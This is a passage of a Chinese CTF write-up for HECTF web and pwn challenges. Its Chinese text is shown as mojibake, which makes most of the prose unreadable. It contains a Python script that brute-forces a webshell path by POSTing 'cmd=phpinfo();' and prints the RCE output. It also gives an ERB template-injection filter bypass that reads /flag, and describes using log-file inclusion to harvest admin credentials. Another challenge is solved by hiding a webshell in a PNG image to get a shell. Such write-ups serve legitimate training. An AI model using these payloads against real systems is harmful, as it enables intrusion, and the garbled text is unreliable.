class="string">&quot;Host&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;BEEFHOOK=v9l9riSiUl5aAaBp1TD92APnVIe94w8whQSHqUW1p9KX43aUihRWqBASlt608WnLT6N4BfmKPSczQ0IN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0, i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POSTæ•°æ®</span></span><br><span class="line">data = <span class="string">&quot;cmd=phpinfo();&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆåŠŸæ ‡è¯†ï¼ˆphpinfo()çš„ç‰¹å¾å†…å®¹ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´ï¼‰</span></span><br><span class="line">success_flag = <span class="string">&quot;PHP Version&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰å¯èƒ½çš„ä¸¤ä½ç»„åˆ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="keyword">for</span> c2 <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment"># æ„é€ å®Œæ•´URL</span></span><br><span class="line">        target_url = base_url.<span class="built_in">format</span>(c1, c2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å°è¯•: <span class="subst">&#123;target_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># å‘é€POSTè¯·æ±‚ï¼ˆè¶…æ—¶æ—¶é—´10ç§’ï¼‰</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                url=target_url,</span><br><span class="line">                headers=headers,</span><br><span class="line">                data=data,</span><br><span class="line">                timeout=<span class="number">10</span>,</span><br><span class="line">                verify=<span class="literal">False</span>  <span class="comment"># å¿½ç•¥SSLè¯ä¹¦éªŒè¯ï¼ˆå¦‚æœéœ€è¦ï¼‰</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ£€æŸ¥å“åº”ä¸­æ˜¯å¦åŒ…å«æˆåŠŸæ ‡è¯†</span></span><br><span class="line">            <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] çˆ†ç ´æˆåŠŸï¼æ­£ç¡®ç»„åˆ: <span class="subst">&#123;c1&#125;</span><span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] å“åº”å†…å®¹ç‰‡æ®µ: <span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>&quot;</span>)  <span class="comment"># è¾“å‡ºéƒ¨åˆ†å“åº”</span></span><br><span class="line">                exit()  <span class="comment"># æ‰¾åˆ°åé€€å‡º</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># é¿å…è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œé—´éš”0.5ç§’ï¼ˆå¯æ ¹æ®ç›®æ ‡è°ƒæ•´ï¼‰</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;è¯·æ±‚é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[!] æ‰€æœ‰ç»„åˆå°è¯•å®Œæ¯•ï¼Œæœªæ‰¾åˆ°åŒ¹é…ç»“æœ&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[!] çˆ†ç ´æˆåŠŸï¼æ­£ç¡®ç»„åˆ: jL</span><br><span class="line">[!] å“åº”å†…å®¹ç‰‡æ®µ: &lt;code&gt;&lt;span style=&quot;color: <span class="params">#0</span>00000&quot;&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>000BB&quot;&gt;<span class="built_in">$</span>file<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;=<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>000BB&quot;&gt;<span class="built_in">$</span><span class="built_in">_</span>GET&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#</span>DD0000&quot;&gt;&#x27;file&#x27;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;]<span class="built_in">&amp;</span>nbsp;??<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æˆåŠŸ RCEï¼Œä¹‹åå°±æ˜¯ RCE è¯»å–æ–‡ä»¶äº†ï¼š</p><h2 id="çº¢å®çŸ³çš„æ¶ä½œå‰§å¤ç°å…ˆè®°å½•ä¸‹æ¥ç»†çœ‹"><a class="markdownIt-Anchor" href="#çº¢å®çŸ³çš„æ¶ä½œå‰§å¤ç°å…ˆè®°å½•ä¸‹æ¥ç»†çœ‹">#</a> <strong>çº¢å®çŸ³çš„æ¶ä½œå‰§</strong>ï¼ˆå¤ç°ï¼Œå…ˆè®°å½•ä¸‹æ¥ï¼Œç»†çœ‹ï¼‰</h2><blockquote><p>ez_ssti</p></blockquote><p>â€‹<strong>WP æ²¡çœ‹æ‡‚ï¼Œå…ˆè®°å½•ä¸‹æ¥ï¼Œä¹‹åç ”ç©¶ä¸‹</strong></p><p>â€‹è¾“å…¥ <code>1+1</code>  è¿”å› 2ï¼Œä½†æ˜¯è¾“å…¥ <code>&#123;&#123;1*1&#125;&#125;</code>  å°±æŠ¥é”™äº†ï¼Œwp é‡Œè¯´è¿™ä¸ªæ˜¯ Ruby ç¯å¢ƒï¼Œå­˜åœ¨ ERB æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‰€ä»¥ç”¨ <code>File.read('/flag'),è¿”å›fakeflag</code>  è¯»å– flagï¼Œä½†æ˜¯è¿”å›äº†ä¸ªå‡çš„ flagï¼š <code>Hello, HECTF&#123;TH1S_lS_a_FAKE_flag&#125;!</code> ï¼Œè¿‡æ»¤çš„ä¸œè¥¿é€šè¿‡åŠ¨æ€å¸¸é‡ç»•è¿‡ï¼Œ <code>Object.const_get(&quot;File&quot;).read(&quot;/flag&quot;)</code> ã€‚</p><h2 id="æ•°æ®ç®¡ç†ç³»ç»Ÿå¤ç°"><a class="markdownIt-Anchor" href="#æ•°æ®ç®¡ç†ç³»ç»Ÿå¤ç°">#</a> <strong>æ•°æ®ç®¡ç†ç³»ç»Ÿ</strong>ï¼ˆå¤ç°ï¼‰</h2><blockquote><p>å¼€å‘å°å“¥ä¸ºäº†ä¸‹ç­ç²—å¿ƒ buff å æ»¡ï¼Œå¤Ÿé¢†å¯¼æ‹¿ç€æ¿å­è¿½ç€æåŠæ¡è¡—ã€‚</p><p><strong>æç¤º 1</strong>1.file å‚æ•°å­˜åœ¨æ—¥å¿—æ³„éœ²</p><p><strong>æç¤º 2</strong>2. å›¾ç‰‡åŒ…å«</p></blockquote><p>â€‹Hint1 é‡Œè¯´çš„æ˜¯ file å‚æ•°å­˜åœ¨æ—¥å¿—æ³„éœ²ï¼Œç»“åˆä¸»é¡µçš„è¿™é‡Œï¼Œæ¨æµ‹å¯ä»¥é€šè¿‡è¿™ä¸ªè¯»å–åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥å…ˆå»è¯»ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/47bd96a49783406c867b80374e91210e.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸­é—´ä»¶æ˜¯ Nginxï¼Œç„¶åéšä¾¿ç™»å½•ä¸‹å‘ç°ç™»å½•æ–¹å¼æ˜¯ GET å¹¶ä¸”æ²¡åŠ å¯†ï¼š <code>/?username=admin&amp;password=asd</code> ï¼Œå¯ä»¥è¯»å–ä¸‹ Nginx çš„æ—¥å¿—æ–‡ä»¶ï¼Œæ¥è·å–è´¦å·å¯†ç ï¼Œå…ˆç”¨ GET æ–¹å¼è¯»ä¸‹ï¼š <code>?file=/var/log/nginx/access.log</code> ï¼Œå¹¶æœæœä¸‹ = adminï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/63f27a7bfc5f447fbb1523ab32a71d4b.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è´¦å·å¯†ç æœ‰äº†ï¼Œä½†æ˜¯å¯èƒ½æœ‰å¹²æ‰°ï¼Œå¾—ä¸€ä¸ªä¸ªè¯•è¯•ï¼Œæœ€åè¯•å‡ºæ¥è¿™ä¸ªå¯¹äº† <code>admin/bdsfasuaosdah42134223829@#!</code> ã€‚</p><p>â€‹åœ¨ä¸ªäººèµ„æ–™é‚£é‡Œæ‰¾åˆ°äº†æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œåšä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæ•´ä¸€ä¸ªæ¯”è¾ƒå°çš„ png å›¾ç‰‡ï¼Œç„¶åç”¨ winhex ä¿®æ”¹é‡Œé¢çš„ä¸€äº›å†…å®¹çš„åå…­è¿›åˆ¶ä¸ºæœ¨é©¬çš„æ–‡æœ¬å¯¹åº”çš„åå…­è¿›åˆ¶ï¼Œèƒ½ç»•è¿‡ getimagesize æ ¡éªŒï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/29ae5590ef36472bac51e54860908de7.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åœ¨è§£å‹è°ƒè¯•ç•Œé¢ï¼Œåˆ†æå‰ç«¯ htmlï¼Œæœ‰ä¸ªè¿™ä¸ªï¼š<br><img data-src="https://i-blog.csdnimg.cn/direct/655bce2bb79248e38ab7e63d5af2273f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è§£å‹è°ƒè¯•ä¸‹é¢æœ‰ä¸ªåœ°æ–¹å†™äº†ä¸ª png æ–‡ä»¶ï¼Œé‚£ä¸ªå°±æ˜¯æˆ‘ä»¬ä¼ ä¸Šå»çš„æœ¨é©¬æ–‡ä»¶ï¼Œä¸è¿‡ä¸ºå•¥æœ€åä¸€æ­¥çš„ç›®å½•æ˜¯è¿™æ ·çš„ä¸çŸ¥é“ï¼Œåé¢ç¯å¢ƒå…³äº†æ²¡æ¥å¾—åŠå†™ï¼Œæ™šä¸Šå®¿èˆæ–­ç”µï¼Œå¤ç°ä¸€åŠç”µè„‘æ²¡ç”µå…³æœºäº†ï¼Œç¬¬äºŒå¤©èµ·æ¥ç¯å¢ƒæ²¡äº†ï¼Œæ‰€ä»¥è´´ä¸€ä¸ª wp é‡Œçš„æˆªå›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/d2c9054d7613419bab1922ae86994eba.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æœ€åå°è¯•åŒ…å«æ–‡ä»¶ï¼Œgetshell</p><p><img data-src="https://i-blog.csdnimg.cn/direct/93ba1ecd7cb848e5a7985144e40151a4.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwnï¼š</h1><h2 id="ncä¸€ä¸‹~"><a class="markdownIt-Anchor" href="#ncä¸€ä¸‹~">#</a> <strong>nc ä¸€ä¸‹ï½</strong></h2><blockquote><p>å°æ˜ä»ç³»ç»Ÿåå°ä¸­å‘ç°äº†ä¸€æ®µæœ‰é—®é¢˜çš„æ—¥å¿—ï¼Œä½ èƒ½ä»ä¸­æ‰¾åˆ°å¥‡æ€ªç‚¹å¹¶ä¸”æ¶ˆé™¤å—ï¼Ÿ</p></blockquote><p>â€‹nc ä¸€ä¸‹å¾—åˆ°æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01 HTTP/1.1&quot; 301 578 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01/ HTTP/1.1&quot; 302 336 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1049 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:31 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:31 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1058 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:33 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:33 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1062 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:35 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:35 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1065 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:36 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:36 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1068 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:38 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:38 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1070 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:47 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:47 +0800] &quot;GET /01/index.php HTTP/1.1&quot; 200 3033 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:57 +0800] &quot;GET /01/data/upload/ HTTP/1.1&quot; 200 1747 &quot;http://192.168.220.132/01/index.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:14 +0800] &quot;POST /01/data/upload/ HTTP/1.1&quot; 200 1805 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:18 +0800] &quot;GET /01/data/upload/upd0te.php HTTP/1.1&quot; 200 512 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:23 +0800] &quot;GET /01/phpinfo.php HTTP/1.1&quot; 200 25051 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:30 +0800] &quot;GET /01/logout.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:30 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1072 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line"></span><br><span class="line">è¯·æ‰¾åˆ°é»‘å®¢çš„æ“ä½œ[ æäº¤ç­”æ¡ˆï¼šç—…æ¯’ä¸Šä¼ çš„æ—¶é—´+ç—…æ¯’åç§° ]ï¼š</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡åˆ†æï¼Œå‘ç°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸”ç›¸å…³æ—¥å¿—æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:57 +0800] &quot;GET /01/data/upload/ HTTP/1.1&quot; 200 1747 &quot;http://192.168.220.132/01/index.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:14 +0800] &quot;POST /01/data/upload/ HTTP/1.1&quot; 200 1805 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:18 +0800] &quot;GET /01/data/upload/upd0te.php HTTP/1.1&quot; 200 512 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br></pre></td></tr></table></figure><p>â€‹ç¬¬äºŒæ¡å¾ˆæ˜¾ç„¶ï¼ŒPOST ä¼ è¾“æ–‡ä»¶ï¼Œç¬¬ä¸‰æ¡ç›´æ¥å‡ºç°äº†è®¿é—®æœ¨é©¬çš„æƒ…å†µï¼Œé‚£ä¹ˆç¬¬ä¸‰æ¡å°±æ˜¯æœ¨é©¬ï¼ˆåé¢å…¨æ˜¯ logout å’Œ login æ“ä½œï¼Œæ‰€ä»¥ä¼°è®¡å°±æ˜¯è¿™ä¸¤æ¡ï¼‰é‚£ä¹ˆè¾“å…¥ <code>02/Jul/2024:18:54:14+upd0te.php</code>  é€šè¿‡ç¬¬ä¸€å…³ï¼Œç¬¬äºŒå…³æ˜¯ä¸ªæ¸¸æˆï¼Œæ²¡ææ‡‚ä»€ä¹ˆ sum é€»è¾‘ï¼Œä½†è¿˜æ˜¯ä¸å°å¿ƒè¿‡äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ­£ç¡®ï¼æ­å–œæ¥åˆ°ç—…æ¯’çš„ä¸–ç•Œï¼Œé€šè¿‡æ•°å­—å¯¹æˆ˜æ¸¸æˆæˆ˜èƒœç—…æ¯’å³å¯æ¶ˆé™¤å®ƒ...</span><br><span class="line"></span><br><span class="line">================ æ•°å­—å¯¹æˆ˜æ¸¸æˆ ===============</span><br><span class="line">1. aã€bã€cçš„å–å€¼èŒƒå›´æ˜¯0-9ï¼Œä¸”é€‰æ‹©ä¸èƒ½é‡å¤</span><br><span class="line">2. é€šè¿‡æŸç§è®¡ç®—ï¼Œæ¯å±€æœ€ç»ˆçš„sumå€¼å¤§çš„ä¸€æ–¹è·èƒœ</span><br><span class="line">3. å…ˆå¾—3åˆ†è€…èƒœ</span><br><span class="line">=============================================</span><br><span class="line"></span><br><span class="line">===== ç¬¬1å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š2</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š9</span><br><span class="line"></span><br><span class="line">------ ç¬¬1å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=2, b=0, c=9</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=2, c=1</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 1 - 0 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬2å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š3</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š1</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š4</span><br><span class="line"></span><br><span class="line">------ ç¬¬2å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=3, b=1, c=4</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=1, c=4</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 1 - 1 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬3å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š2</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š3</span><br><span class="line"></span><br><span class="line">------ ç¬¬3å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=2, b=0, c=3</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=1, b=0, c=4</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 1 - 2 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬4å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š1</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š4</span><br><span class="line"></span><br><span class="line">------ ç¬¬4å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=1, b=0, c=4</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=2, c=1</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 2 - 2 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬5å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š1</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span 